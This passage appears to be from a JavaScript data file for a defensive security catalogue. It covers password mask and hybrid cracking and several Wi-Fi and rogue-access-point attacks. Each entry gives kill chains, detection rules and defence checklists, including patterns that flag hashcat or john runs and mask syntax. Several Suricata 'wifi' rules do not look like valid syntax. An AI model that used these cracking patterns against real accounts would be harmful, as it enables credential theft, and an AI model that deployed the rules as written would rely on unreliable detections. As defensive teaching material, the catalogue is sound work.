detection:
    selection:
        Image|endswith:
            - '\\hashcat.exe'
            - '\\hashcat'
            - '\\john.exe'
            - '\\john'
        CommandLine|contains:
            - ' -r '
            - ' --rules-file'
            - ' -m '
    condition: selection
fields:
    - Image
    - CommandLine
    - User
level: high
tags:
    - attack.credential_access
    - attack.t1110.002`,
      splunk: `index=sysmon EventCode=1 (Image="*hashcat*" OR Image="*john*") CommandLine="*-r*"
| eval Alert="HIGH: Hybrid Password Cracking Tool Execution with Mutation Rules"
| table _time, host, Image, CommandLine, User, Alert`,
      suricata: `# Host-level rule:
alert tcp $HOME_NET any -> $EXTERNAL_NET any (
    msg:"SEC-ALERT Outbound Transmission of Password Cracking Potfile";
    flow:to_server,established;
    content:"hashcat.potfile"; nocase;
    classtype:bad-unknown;
    sid:1000038;
    rev:1;
)`,
      sysmon: `# Verify password complexity requirements via PowerShell:
Get-ADDefaultDomainPasswordPolicy`
    },
    defenseChecklist: [
      { id: "hyb_1", title: "Enforce Multi-Word Passphrases (> 20 chars)", tier: "Password Policy", desc: "Require 20+ character multi-word passphrases; hybrid mutation combinatorics become mathematically intractable for long passphrases." },
      { id: "hyb_2", title: "Screen for Predictable Mutation Patterns", tier: "Identity Hardening", desc: "Deploy password filters that reject passwords utilizing common seasonal prefixes and year suffixes (e.g. 'Summer2026!')." },
      { id: "hyb_3", title: "Mandate Phishing-Resistant MFA", tier: "Access Control", desc: "Deploy FIDO2 security keys so that even if a hybrid attack recovers a user password, the attacker cannot complete authentication." },
      { id: "hyb_4", title: "Proactive Internal Password Audits", tier: "SecOps", desc: "Conduct monthly offline audits of Active Directory NTDS.dit hashes using Hashcat rules to proactively identify and force resets on weak passwords." }
    ]
  },

  {
    num: 39,
    id: "mask-attack",
    name: "Mask Attack (Constrained Pattern-Based Keyspace Traversal)",
    shortName: "Mask Attack",
    moduleGroup: "password",
    module: "Module 4: Password Security Attacks",
    category: "pwd-crack",
    severity: "high",
    cvss: "8.2",
    mitre: "T1110.002, T1003",
    primaryTargets: "Complexity-Enforced Password Hashes, Enterprise Active Directory Accounts, Wi-Fi WPA2 Handshakes",
    threatActors: "Advanced Persistent Threats, Penetration Testers, Cryptanalysts",
    summary: "A Mask Attack is a targeted cryptanalytic attack that drastically reduces the exponential search space of a pure brute-force attack by utilizing structural patterns that humans follow when creating passwords to meet corporate complexity policies. Using syntax like ?u?l?l?l?l?d?d?d?s (Uppercase, 4 Lowercase, 3 Digits, Symbol), it evaluates policy-compliant candidates with maximum mathematical efficiency.",
    killChain: [
      {
        step: 1,
        title: "Enterprise Complexity Policy Reconnaissance",
        mitre: "T1201",
        desc: "Analyzing corporate password requirements (e.g. minimum 8 characters, at least 1 uppercase, 1 lowercase, 1 number, and 1 special symbol)."
      },
      {
        step: 2,
        title: "Human Pattern & Bias Modeling",
        mitre: "T1110.002",
        desc: "Modeling psychological habituation: over 80% of users place the uppercase letter at position 1, digits at the end, and a symbol at the very end."
      },
      {
        step: 3,
        title: "Mask Syntax Specification",
        mitre: "T1110.002",
        desc: "Defining Hashcat mask patterns (e.g. ?u?l?l?l?l?d?d?s for 'Pword99!' or ?u?l?l?l?l?l?l?d?s for 9-character patterns)."
      },
      {
        step: 4,
        title: "Search Space Reduction & GPU Provisioning",
        mitre: "T1110.002",
        desc: "Reducing keyspace from 95^8 (6.6 quadrillion permutations) to targeted billions, making cracking feasible within hours on consumer GPUs."
      },
      {
        step: 5,
        title: "High-Speed Hardware Mask Evaluation",
        mitre: "T1110.002",
        desc: "Streaming pattern bytes directly into GPU cores, testing candidates against exfiltrated NTLM or WPA2 4-way handshake hashes."
      },
      {
        step: 6,
        title: "Plaintext Recovery & Account Compromise",
        mitre: "T1078.002",
        desc: "Recovering policy-compliant cleartext passwords and executing administrative logons across enterprise infrastructure."
      }
    ],
    telemetry: {
      sources: [
        "Endpoint Detection & Response (Process execution alerts for hashcat.exe with -a 3 mask mode)",
        "Windows Security Event Logs (Event ID 4624 logons using recovered credentials)",
        "Active Directory Telemetry (Sudden administrative logons from unrecognized IP addresses)",
        "File System Monitoring (Presence of .hcmask files on compromised hosts)"
      ],
      anomalies: [
        "Process execution of hashcat with arguments '-a 3' (Brute-force / Mask mode)",
        "Creation or loading of files with the '.hcmask' extension",
        "Sudden simultaneous successful logins across diverse domain accounts from a single host"
      ]
    },
    rules: {
      sigma: `title: Hashcat Mask Attack Execution (-a 3)
id: 9f2b5d0e-36c1-4e89-9a50-6cb08c290039
status: stable
description: Detects command-line execution of Hashcat running in mask attack mode (-a 3).
author: SOC Detection Engineering
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith:
            - '\\hashcat.exe'
            - '\\hashcat'
        CommandLine|contains:
            - ' -a 3 '
            - ' -a3 '
            - '.hcmask'
            - '?u?l?l'
    condition: selection
fields:
    - Image
    - CommandLine
    - User
level: high
tags:
    - attack.credential_access
    - attack.t1110.002`,
      splunk: `index=sysmon EventCode=1 (Image="*hashcat*" OR Image="*john*") (CommandLine="*-a 3*" OR CommandLine="*-a3*" OR CommandLine="*?u?l*")
| eval Alert="HIGH: Hashcat Mask Attack Execution Detected"
| table _time, host, Image, CommandLine, User, Alert`,
      suricata: `# Host-level rule:
alert tcp $HOME_NET any -> $EXTERNAL_NET any (
    msg:"SEC-ALERT Outbound Data Containing Hashcat Mask Definitions";
    flow:to_server,established;
    content:".hcmask"; nocase;
    classtype:bad-unknown;
    sid:1000039;
    rev:1;
)`,
      sysmon: `# Inspect domain fine-grained password policy settings:
Get-ADFineGrainedPasswordPolicy -Filter * 2>$null`
    },
    defenseChecklist: [
      { id: "mask_1", title: "Prioritize Passphrase Length Over Character Variety", tier: "Password Policy", desc: "Mandate minimum 16-20 character passphrases instead of 8-character complex passwords; mask attack complexity grows exponentially with length." },
      { id: "mask_2", title: "Deploy Passwordless Authentication", tier: "Identity Architecture", desc: "Implement FIDO2 passkeys or Windows Hello for Business, replacing shared secrets with public-key cryptography." },
      { id: "mask_3", title: "Deploy Dynamic Proactive Password Audits", tier: "SecOps", desc: "Audit password hashes regularly with mask templates (?u?l?l?l?l?d?d?s) to detect and remediate policy-predictable passwords." },
      { id: "mask_4", title: "Deprecate Fast Hashing Algorithms", tier: "Cryptographic Standards", desc: "Ensure all password stores utilize memory-hard key derivation (Argon2id, scrypt) to render GPU mask evaluation prohibitively slow." }
    ]
  },

  // =========================================================================
  // WIRELESS ATTACKS (40 - 44)
  // =========================================================================
  {
    num: 40,
    id: "evil-twin",
    name: "Evil Twin Attack",
    shortName: "Evil Twin Attack",
    moduleGroup: "wireless",
    module: "Wireless Attacks",
    category: "wireless",
    severity: "high",
    cvss: "8.1",
    mitre: "T1557.004",
    primaryTargets: "Corporate Wi-Fi Clients, Mobile Endpoints, BYOD Devices",
    threatActors: "Rogue Access Point Operators, Physical Facility Infiltrators, Red Teams",
    summary: "An Evil Twin attack involves setting up a rogue 802.11 wireless access point broadcasting the identical SSID (and often cloned BSSID MAC address) as a legitimate enterprise network. By transmitting with higher radio signal power or forcing client disassociations from the legitimate AP, adversaries trick client devices into silently associating with the malicious AP, enabling complete traffic interception, credential theft, and DNS poisoning.",
    killChain: [
      {
        step: 1,
        title: "RF Reconnaissance & AP Cloning",
        mitre: "T1595.002",
        desc: "Scanning local 2.4 GHz and 5 GHz frequency bands to identify target enterprise SSIDs, operating channels, and MAC addresses."
      },
      {
        step: 2,
        title: "Client Association Redirection",
        mitre: "T1557.004",
        desc: "Broadcasting identical SSID beacons with high transmission gain while issuing deauthentication frames against the genuine access point."
      },
      {
        step: 3,
        title: "MitM Traffic Interception & Harvesting",
        mitre: "T1040",
        desc: "Routing victim traffic through an attacker bridge to inspect unencrypted traffic, strip TLS certificates, or prompt for captive portal credentials."
      }
    ],
    telemetry: {
      sources: [
        "Wireless Intrusion Prevention System (WIPS) Sensor Logs",
        "Access Point Controller BSSID / Channel Collision Alerts",
        "Endpoint 802.1X Certificate Validation Failure Telemetry"
      ],
      anomalies: [
        "Multiple identical SSIDs detected operating on non-standard channels with disparate BSSIDs",
        "Sudden spike in 802.11 association requests directed toward an unmanaged radio MAC address",
        "Endpoint alerts regarding untrusted RADIUS server certificates during enterprise Wi-Fi authentication"
      ]
    },
    rules: {
      sigma: `title: Rogue Access Point / Evil Twin BSSID Collision
id: 1a2b3c4d-5e6f-7a8b-9c0d-1e2f3a4b5c6d
status: production
description: Detects multiple access points advertising the same corporate SSID with unauthorized BSSIDs.
logsource:
    category: wips
detection:
    selection:
        ssid: 'Corp_Secure_WiFi'
        authorized_ap: false
    condition: selection
level: high
tags:
    - attack.credential_access
    - attack.t1557.004`,
      splunk: `index=wireless_wips alert_type="Rogue AP Detected" OR alert_type="SSID Spoofing"
| stats count values(channel) as channels values(bssid) as bssids by ssid, location
| where count > 1
| eval Alert="CRITICAL: Evil Twin / SSID Spoofing Detected on Campus"
| table _time, ssid, location, channels, bssids, count, Alert`,
      suricata: `alert wifi any any -> any any (
    msg:"SEC-ALERT Evil Twin Access Point Detected (Duplicate SSID Different BSSID)";
    wlan.fc.type == 0 && wlan.fc.subtype == 8; # 802.11 Beacon frame
    threshold: type both, track by_src, count 20, seconds 5;
    classtype:bad-unknown;
    sid:1000040;
    rev:1;
)`,
      sysmon: `# Wireless profile inspection on Windows endpoints:
netsh wlan show networks mode=bssid | findstr /i "SSID BSSID Channel Signal"`
    },
    defenseChecklist: [
      { id: "etw_1", title: "Enforce WPA3-Enterprise (802.1X)", tier: "Wireless Infrastructure", desc: "Deploy EAP-TLS with mutual cryptographic client-and-server certificate validation to prevent rogue AP connections." },
      { id: "etw_2", title: "Deploy Enterprise WIPS", tier: "Physical Security", desc: "Install dedicated Wireless Intrusion Prevention sensors to automatically contain unauthorized APs via containment frames." },
      { id: "etw_3", title: "Disable Auto-Connect to Open Wi-Fi", tier: "Endpoint MDM", desc: "Enforce MDM profiles banning endpoints from auto-connecting to open or unverified Wi-Fi networks." },
      { id: "etw_4", title: "Mandatory Always-On VPN", tier: "Network", desc: "Require mutual IPsec or WireGuard tunnels for all traffic originating from corporate endpoints outside trusted zones." }
    ]
  },

  {
    num: 41,
    id: "deauth-attack",
    name: "Deauthentication Attack",
    shortName: "Deauth Attack",
    moduleGroup: "wireless",
    module: "Wireless Attacks",
    category: "wireless",
    severity: "medium",
    cvss: "6.5",
    mitre: "T1498, T1499",
    primaryTargets: "802.11ac/n Wi-Fi Clients, POS Terminals, Wireless Security Cameras",
    threatActors: "Local Attackers, War-drivers, Penetration Testers",
    summary: "An 802.11 Deauthentication Attack targets the communication between a wireless station and an access point by transmitting spoofed management frames. Because standard 802.11 management frames are unencrypted, an attacker can spoof the source MAC address of the access point and broadcast deauth/disassociation frames, instantly knocking victim devices offline to disrupt service or force a WPA handshake capture upon reconnect.",
    killChain: [
      {
        step: 1,
        title: "Channel & Client Sniffing",
        mitre: "T1040",
        desc: "Monitoring 802.11 traffic to identify target client MAC addresses associated with a specific BSSID."
      },
      {
        step: 2,
        title: "Spoofed Deauth Frame Injection",
        mitre: "T1498.001",
        desc: "Transmitting continuous 802.11 Type 0 Subtype 12 (Deauthentication) frames spoofing the AP's hardware MAC address."
      },
      {
        step: 3,
        title: "Handshake Sniffing or DoS Maintenance",
        mitre: "T1110",
        desc: "Capturing the EAPOL 4-way handshake when the victim automatically re-associates, or sustaining the flood for DoS."
      }
    ],
    telemetry: {
      sources: [
        "WIPS Sensor Management Frame Telemetry",
        "Access Point Syslog (Excessive client disassociation notifications)",
        "Client Operating System Wi-Fi Event Logs (Reason code 7 or 8 disassociations)"
      ],
      anomalies: [
        "Sudden burst of hundreds of 802.11 deauth management frames within a sub-second interval",
        "Simultaneous disconnection of multiple wireless clients associated with the same BSSID",
        "Repeated EAPOL 4-way handshake exchanges occurring immediately following disconnections"
      ]
    },
    rules: {
      sigma: `title: High-Rate 802.11 Deauthentication Frame Flood
id: 2b3c4d5e-6f7a-8b9c-0d1e-2f3a4b5c6d7e
status: production
description: Detects an anomalous volume of 802.11 deauthentication management frames indicative of a Wi-Fi DoS or handshake capture attack.
logsource:
    category: wireless_sensor
detection:
    selection:
        frame_type: 'deauth'
    timeframe: 2s
    condition: selection | count() > 50
level: medium
tags:
    - attack.impact
    - attack.t1498`,
      splunk: `index=wifi_wips frame_subtype="deauthentication"
| bin _time span=5s
| stats count by bssid, client_mac
| where count > 30
| eval Alert="HIGH: 802.11 Deauthentication Flood in Progress"
| table _time, bssid, client_mac, count, Alert`,
      suricata: `alert wifi any any -> any any (
    msg:"SEC-ALERT 802.11 Excessive Deauthentication Frames (Possible WPA Handshake Harvest)";
    wlan.fc.type == 0 && wlan.fc.subtype == 12; # Deauth
    threshold: type both, track by_src, count 25, seconds 2;
    classtype:denial-of-service;
    sid:1000041;
    rev:1;
)`,
      sysmon: `# Linux wireless diagnostic check for deauthentication frequency
iw dev wlan0 link | grep -i "Connected to"`
    },
    defenseChecklist: [
      { id: "deauth_1", title: "Enforce 802.11w (PMF)", tier: "Wireless Infrastructure", desc: "Mandate Protected Management Frames (802.11w / PMF) across all SSIDs to cryptographically sign deauth frames." },
      { id: "deauth_2", title: "Transition to WPA3", tier: "Wireless Protocol", desc: "Upgrade wireless infrastructure to WPA3-Personal/Enterprise where PMF is strictly mandatory." },
      { id: "deauth_3", title: "Deploy Wireless IDS/IPS", tier: "Monitoring", desc: "Configure access points to detect RF deauthentication floods and alert security personnel to physical location." },
      { id: "deauth_4", title: "Wired Fallback for Critical IoT", tier: "Architecture", desc: "Migrate mission-critical assets (security cameras, access control scanners) to wired 802.3 Ethernet." }
    ]
  },

  {
    num: 42,
    id: "wifi-eavesdropping",
    name: "Wi-Fi Eavesdropping",
    shortName: "Wi-Fi Eavesdropping",
    moduleGroup: "wireless",
    module: "Wireless Attacks",
    category: "wireless",
    severity: "high",
    cvss: "7.4",
    mitre: "T1040",
    primaryTargets: "Unencrypted Hotspots, Legacy WEP/WPA-TKIP Networks, Public Guest Wi-Fi",
    threatActors: "Cybercriminals, Intelligence Agencies, Eavesdropping Sniffers",
    summary: "Wi-Fi Eavesdropping is the passive interception of radio frequency transmissions over 802.11 wireless networks. Because wireless signals propagate omnidirectionally through physical boundaries, an attacker equipped with a wireless network adapter in monitor mode can capture all raw 802.11 frames, reconstructing cleartext HTTP payloads, DNS queries, and credentials transmitted over insecure or legacy networks.",
    killChain: [
      {
        step: 1,
        title: "Monitor Mode Channel Tuning",
        mitre: "T1040",
        desc: "Configuring a wireless NIC into promiscuous monitor mode and locking to the target channel frequency."
      },
      {
        step: 2,
        title: "Passive Over-the-Air Packet Capture",
        mitre: "T1040",
        desc: "Capturing all 802.11 data and management frames traversing the local radio environment without transmitting any packets."
      },
      {
        step: 3,
        title: "Protocol Disassembly & Cleartext Extraction",
        mitre: "T1557",
        desc: "Parsing pcap stream files to extract session tokens, unencrypted login credentials, and user browsing history."
      }
    ],
    telemetry: {
      sources: [
        "Network Boundary Flow Logs (Cleartext HTTP/DNS sessions originating from wireless VLANs)",
        "Access Point Client Encryption Capability Audits",
        "Endpoint EDR (Detection of unencrypted protocol connections)"
      ],
      anomalies: [
        "Client endpoints transmitting sensitive credentials over unencrypted wireless networks",
        "Outdated or deprecated encryption protocols (WEP, WPA1, TKIP) active in the wireless environment",
        "Detection of promiscuous radio hardware in physical proximity via directional RF analyzers"
      ]
    },
    rules: {
      sigma: `title: Unencrypted Cleartext Traffic on Wireless Subnet
id: 3c4d5e6f-7a8b-9c0d-1e2f-3a4b5c6d7e8f
status: production
description: Detects transmission of cleartext credentials or protocols across wireless subnets susceptible to eavesdropping.
logsource:
    category: network_connection
detection:
    selection:
        SourceSubnet: '172.16.50.0/24' # Wireless VLAN
        DestinationPort:
            - 80
            - 21
            - 23
            - 110
    condition: selection
level: medium
tags:
    - attack.credential_access
    - attack.t1040`,
      splunk: `index=network sourcetype=bro_conn dest_port IN (80, 21, 23) src_ip="172.16.50.*"
| stats count by src_ip, dest_ip, dest_port
| eval Alert="WARNING: Cleartext Traffic on Wi-Fi Subnet Vulnerable to Eavesdropping"
| table src_ip, dest_ip, dest_port, count, Alert`,
      suricata: `alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (
    msg:"SEC-ALERT Unencrypted HTTP Basic Auth Over Wireless Link";
    content:"Authorization: Basic"; http_header;
    classtype:policy-violation;
    sid:1000042;
    rev:1;
)`,
      sysmon: `# Verify client connection security type in Windows PowerShell
netsh wlan show interfaces | findstr /i "SSID Radio type Authentication Cipher"`
    },
    defenseChecklist: [
      { id: "weav_1", title: "Mandate WPA3-Enterprise / WPA2-AES", tier: "Wireless Infrastructure", desc: "Decommission WEP, WPA-TKIP, and open SSIDs across all facilities; enforce CCMP/AES encryption." },
      { id: "weav_2", title: "Enforce End-to-End TLS 1.3", tier: "Application", desc: "Ensure all web endpoints, APIs, and client services mandate TLS 1.3 with HSTS preloading." },
      { id: "weav_3", title: "Client Isolation", tier: "Access Point", desc: "Enable client isolation on guest and BYOD wireless networks to prevent peer-to-peer frame snooping." },
      { id: "weav_4", title: "RF Attenuation & Power Tuning", tier: "Physical", desc: "Tune AP transmit power levels to restrict RF propagation strictly within corporate building perimeter walls." }
    ]
  },

  {
    num: 43,
    id: "wifi-jamming",
    name: "Wi-Fi Jamming",
    shortName: "Wi-Fi Jamming",
    moduleGroup: "wireless",
    module: "Wireless Attacks",
    category: "wireless",
    severity: "high",
    cvss: "7.1",
    mitre: "T1499",
    primaryTargets: "Wireless IoT Sensors, Wi-Fi Security Systems, Warehouses, Logistics Terminals",
    threatActors: "Physical Burglars, Extortionists, Malicious Competitors",
    summary: "Wi-Fi Jamming is an intentional physical-layer radio frequency interference attack. By emitting high-power RF noise or malformed packets across the 2.4 GHz, 5 GHz, or 6 GHz frequency bands, the attacker elevates the background noise floor well above the Signal-to-Noise Ratio (SNR) threshold, preventing client receivers from demodulating legitimate 802.11 signals and causing complete wireless outage.",
    killChain: [
      {
        step: 1,
        title: "RF Frequency & Spectrum Sweeping",
        mitre: "T1595.002",
        desc: "Attacker uses a spectrum analyzer to measure active operating channels and bandwidth (20/40/80 MHz)."
      },
      {
        step: 2,
        title: "High-Gain RF Carrier Emission",
        mitre: "T1499",
        desc: "Broadcasting continuous carrier wave or chirped pulses across the target Wi-Fi channel frequencies."
      },
      {
        step: 3,
        title: "Channel Saturation & CSMA/CA Lockout",
        mitre: "T1499.001",
        desc: "Elevating noise floor so Clear Channel Assessment (CCA) mechanisms indefinitely hold back transmissions."
      }
    ],
    telemetry: {
      sources: [
        "WIPS Spectrum Analyzer Sensor Telemetry",
        "Access Point Radio Health Logs (Severe drop in SNR, massive increase in channel noise floor)",
        "IoT Controller Heartbeat Loss Notifications"
      ],
      anomalies: [
        "Sudden elevation of RF noise floor above -65 dBm across specific wireless channels",
        "100% channel utilization without corresponding legitimate 802.11 data frames (non-Wi-Fi interference)",
        "Simultaneous loss of connection across all wireless clients in a localized physical zone"
      ]
    },
    rules: {
      sigma: `title: Severe Wireless RF Interference / Jamming Event
id: 4d5e6f7a-8b9c-0d1e-2f3a-4b5c6d7e8f9a
status: production
description: Detects sudden rise in noise floor and channel utilization characteristic of active RF jamming.
logsource:
    category: wireless_spectrum
detection:
    selection:
        noise_floor|gt: -70
        channel_utilization|gt: 95
        frame_decode_rate|lt: 5
    condition: selection
level: high
tags:
    - attack.impact
    - attack.t1499`,
      splunk: `index=wifi_wips alert_name="Interference Detected" OR alert_name="Channel Jammed"
| stats count by ap_name, channel, noise_floor
| where noise_floor > -70
| eval Alert="CRITICAL: Physical RF Jamming Suspected on AP"
| table _time, ap_name, channel, noise_floor, Alert`,
      suricata: `alert wifi any any -> any any (
    msg:"SEC-ALERT High Non-802.11 Radio Energy Detected on Channel";
    threshold: type both, track by_src, count 10, seconds 5;
    classtype:denial-of-service;
    sid:1000043;
    rev:1;
)`,
      sysmon: `# Inspecting local wireless interface signal-to-noise ratio:
netsh wlan show interfaces | findstr /i "Signal"`
    },
    defenseChecklist: [
      { id: "wjam_1", title: "Dynamic Frequency Selection (DFS) & Auto-Channel", tier: "Wireless Controller", desc: "Configure access points to automatically hop to clean alternative channels upon detecting high localized RF noise." },
      { id: "wjam_2", title: "Dual-Band / Tri-Band Redundancy", tier: "Infrastructure", desc: "Deploy dual/tri-band APs allowing clients to seamlessly transition between 2.4 GHz, 5 GHz, and 6 GHz spectrum." },
      { id: "wjam_3", title: "Spectrum Monitoring & Triangulation", tier: "Physical Security", desc: "Deploy dedicated WIPS spectrum sensors to pinpoint the physical geolocation of rogue RF transmitters." },
      { id: "wjam_4", title: "Hardwired Backup for Alarms", tier: "Facility", desc: "Mandate hardwired Ethernet or dual-SIM cellular backhaul for all security and life-safety systems." }
    ]
  },

  {
    num: 44,
    id: "wps-pin-attack",
    name: "WPS PIN Attack",
    shortName: "WPS PIN Attack",
    moduleGroup: "wireless",
    module: "Wireless Attacks",
    category: "wireless",
    severity: "high",
    cvss: "7.5",
    mitre: "T1110",
    primaryTargets: "Small Office / Home Office (SOHO) Routers, Legacy Access Points",
    threatActors: "Opportunistic Attackers, Wardrivers, Automated Script Users",
    summary: "Wi-Fi Protected Setup (WPS) PIN attacks exploit a structural cryptographic design flaw in the WPS protocol. The 8-digit PIN is validated by the access point in two independent halves (the first 4 digits, then the remaining 3 digits plus a checksum). This reduces the mathematical brute-force search space from 100,000,000 down to only 11,000 possibilities (or even fewer using PixieDust offline PRNG attacks), allowing attackers to recover the plain WPA/WPA2 pre-shared key within minutes.",
    killChain: [
      {
        step: 1,
        title: "WPS Beacon Identification",
        mitre: "T1595.002",
        desc: "Scanning for access points advertising WPS 1.0/2.0 feature support in their 802.11 beacon information elements."
      },
      {
        step: 2,
        title: "PIN Guessing & Nonce Harvesting",
        mitre: "T1110",
        desc: "Exchanging EAP-WSC messages (M1 through M4) with the AP to test PIN halves or capture PRNG nonces."
      },
      {
        step: 3,
        title: "WPA Pre-Shared Key Extraction",
        mitre: "T1552",
        desc: "Upon successful verification of the 8th digit, the AP transmits the complete plaintext WPA2 passphrase in message M7."
      }
    ],
    telemetry: {
      sources: [
        "Access Point Authentication Syslog (Repeated WPS registrar authentication requests)",
        "WIPS Alert Logs (WPS brute-force rate-limit violations)",
        "Wireless Controller Audit Configuration"
      ],
      anomalies: [
        "Dozens of EAP-WSC protocol initiation attempts from a single unauthenticated MAC address",
        "WPS lockout state triggered repeatedly on target access point",
        "Repeated M1-M4 frame exchanges without completed client association"
      ]
    },
    rules: {
      sigma: `title: WPS PIN Brute Force Authentication Attempt
id: 5e6f7a8b-9c0d-1e2f-3a4b-5c6d7e8f9a0b
status: production
description: Detects repetitive WPS EAP-WSC authentication failures characteristic of Reaver or PixieDust attacks.
logsource:
    category: wireless_ap
detection:
    selection:
        message|contains:
            - 'WPS PIN failure'
            - 'EAP-WSC M4 failure'
    timeframe: 1m
    condition: selection | count() > 10
level: high
tags:
    - attack.credential_access
    - attack.t1110`,
      splunk: `index=wifi_ap "WPS PIN failure" OR "WPS transaction failed"
| stats count by ap_mac, client_mac
| where count > 15
| eval Alert="HIGH: Active WPS PIN Brute Force Attack Detected"
| table _time, ap_mac, client_mac, count, Alert`,
      suricata: `alert wifi any any -> any any (
    msg:"SEC-ALERT High-Rate WPS EAP-WSC PIN Exchange Requests";
    content:"|00 37 2a|"; # WPS Enterprise OUI
    threshold: type both, track by_src, count 10, seconds 15;
    classtype:attempted-user;
    sid:1000044;
    rev:1;
)`,
      sysmon: `# Check if WPS is advertised on local networks
netsh wlan show networks mode=bssid`
    },
    defenseChecklist: [
      { id: "wps_1", title: "Disable WPS Globally", tier: "AP Firmware", desc: "Permanently disable Wi-Fi Protected Setup (WPS) in the management console of all enterprise and branch routers." },
      { id: "wps_2", title: "Deploy Enterprise WPA3", tier: "Wireless Infrastructure", desc: "Upgrade to WPA3-Personal (SAE) or WPA3-Enterprise where WPS is obsolete and unsupported." },
      { id: "wps_3", title: "Enforce Hardware Lockout", tier: "Device Hardening", desc: "If WPS cannot be disabled, ensure aggressive hardware rate limiting and permanent lockout after 3 failed attempts." },
      { id: "wps_4", title: "Update Router Firmware", tier: "Vulnerability Management", desc: "Patch SOHO router firmware to eliminate weak PRNG seeds vulnerable to PixieDust offline recovery." }
    ]
  },

  // =========================================================================
  // MODULE 5: ROGUE WIRELESS DEVICE ATTACKS (45 - 49)
  // =========================================================================
  {
    num: 45,
    id: "rogue-ap",
    name: "Rogue Access Point Attack",
    shortName: "Rogue AP Attack",
    moduleGroup: "rogue",
    module: "Rogue Wireless Device Attacks",
    category: "rogue",
    severity: "critical",
    cvss: "8.8",
    mitre: "T1200",
    primaryTargets: "Corporate Switch Infrastructure, Internal Wired LANs, Secure Campus Networks",
    threatActors: "Malicious Insiders, Social Engineers, Rogue Employees",
    summary: "A Rogue Access Point is an unauthorized wireless AP physically plugged into an active enterprise network switch port or wall jack without organizational authorization. Because it circumvents perimeter firewalls, 802.1X supplicants, and network access controls, it bridges the physical wired corporate LAN directly to the airwaves, granting nearby external adversaries unhindered access to internal corporate databases and servers.",
    killChain: [
      {
        step: 1,
        title: "Physical Infiltration & Port Connection",
        mitre: "T1200",
        desc: "Adversary or rogue insider physically connects an unauthorized consumer Wi-Fi router into an active corporate Ethernet jack."
      },
      {
        step: 2,
        title: "Wired Subnet Bridging",
        mitre: "T1078",
        desc: "The rogue AP receives an internal IP address via DHCP and bridges wireless broadcast traffic directly onto the corporate VLAN."
      },
      {
        step: 3,
        title: "External Wireless Infiltration",
        mitre: "T1021",
        desc: "Attacker parks in a nearby parking lot and connects to the rogue AP, establishing an interactive shell inside the internal network."
      }
    ],
    telemetry: {
      sources: [
        "Network Switch Syslog (New MAC address detected on access port, Port Security violations)",
        "Enterprise DHCP Server Logs (DHCP leases requested by unmanaged consumer router vendors)",
        "WIPS Sensor Telemetry (Detection of wireless BSSIDs connected to wired Ethernet segments)"
      ],
      anomalies: [
        "Multiple distinct MAC addresses appearing behind a single physical switch port (switch acting as bridge)",
        "Unapproved OUI vendor prefixes (e.g., TP-Link, Netgear, D-Link) appearing in enterprise DHCP lease tables",
        "WIPS correlation showing an over-the-air BSSID actively forwarding packets onto the wired core"
      ]
    },
    rules: {
      sigma: `title: Unauthorized Wireless AP Plugged into Corporate Switch Port
id: 6f7a8b9c-0d1e-2f3a-4b5c-6d7e8f9a0b1c
status: production
description: Detects Port Security violations and unauthorized MAC addresses matching consumer router vendors on switch ports.
logsource:
    category: network_switch
detection:
    selection:
        event_type: 'port_security_violation'
    condition: selection
fields:
    - switch_ip
    - interface
    - offending_mac
level: critical
tags:
    - attack.initial_access
    - attack.t1200`,
      splunk: `index=network sourcetype=cisco_ios "PORT_SECURITY-2-PVIOLATION" OR "LINK-3-UPDOWN"
| stats count by host, src_interface, mac_address
| eval Alert="CRITICAL: Port Security Violation - Rogue Device Plugged In"
| table _time, host, src_interface, mac_address, Alert`,
      suricata: `alert tcp $HOME_NET any -> $EXTERNAL_NET any (
    msg:"SEC-ALERT Consumer Router Web UI Traffic on Internal Switch";
    content:"NETGEAR" nocase; content:"Router Setup";
    classtype:policy-violation;
    sid:1000045;
    rev:1;
)`,
      sysmon: `# Query switch ARP and MAC address tables for multiple MACs per port
show mac address-table interface GigabitEthernet0/1`
    },
    defenseChecklist: [
      { id: "rap_1", title: "Enable 802.1X Port Authentication", tier: "Switching", desc: "Require 802.1X EAP authentication on every physical switch port to block uncertified devices from linking." },
      { id: "rap_2", title: "Enforce Port Security (Max 1 MAC)", tier: "Switching", desc: "Limit physical switch ports to a maximum of 1 MAC address and configure err-disable upon violation." },
      { id: "rap_3", title: "Deploy Continuous WIPS Scanning", tier: "Wireless Infrastructure", desc: "Use WIPS sensors to continuously compare over-the-air packets against wired switch port traffic to flag bridges." },
      { id: "rap_4", title: "Disable Unused Wall Jacks", tier: "Physical Layer", desc: "Administratively shut down all unused Ethernet switch ports across corporate conference rooms and hallways." }
    ]
  },

  {
    num: 46,
    id: "evil-twin-captive",
    name: "Evil Twin Attack (Captive Portal Variant)",
    shortName: "Evil Twin (Captive)",
    moduleGroup: "rogue",
    module: "Rogue Wireless Device Attacks",
    category: "rogue",
    severity: "high",
    cvss: "8.3",
    mitre: "T1557.004, T1566",
    primaryTargets: "Corporate Remote Workers, Travelers, Conference Attendees",
    threatActors: "Credential Harvesters, Initial Access Brokers, Social Engineers",
    summary: "This variant of the Evil Twin attack pairs a rogue 802.11 access point with an aggressive HTTP captive portal engine (e.g. wifiphisher, Airgeddon). Once a victim connects to the cloned network, all web requests are hijacked by an internal DNS/HTTP daemon that serves a convincing corporate login overlay, prompting the user for Active Directory credentials, VPN passwords, or MFA tokens under the guise of an 'urgent security update'.",
    killChain: [
      {
        step: 1,
        title: "SSID Masquerading & Deauth",
        mitre: "T1557.004",
        desc: "Deploying a rogue AP advertising the target corporate SSID while kicking victims off the authentic network."
      },
      {
        step: 2,
        title: "DNS Catch-All Redirection",
        mitre: "T1568.002",
        desc: "Configuring a local DNS daemon (dnsmasq) to resolve all domain queries (*.com, *.org) to the attacker's captive portal IP."
      },
      {
        step: 3,
        title: "Credential Harvesting via Clone Portal",
        mitre: "T1056",
        desc: "Serving a cloned corporate Okta or Microsoft 365 login screen that records submitted passwords and session tokens."
      }
    ],
    telemetry: {
      sources: [
        "Endpoint EDR Browser Telemetry (Alerts on SSL certificate mismatch for captive portal domains)",
        "Identity Provider Logs (Logon attempts from unexpected IP/geolocations immediately following mobile disconnects)",
        "WIPS Rogue AP Detection Logs"
      ],
      anomalies: [
        "Browser warnings citing captive portal redirection attempting to intercept HTTPS sessions",
        "Corporate credentials submitted to unverified, unencrypted HTTP forms hosted on 192.168.x.x subnets",
        "Rapid burst of failed user authentication events followed by successful proxy logon"
      ]
    },
    rules: {
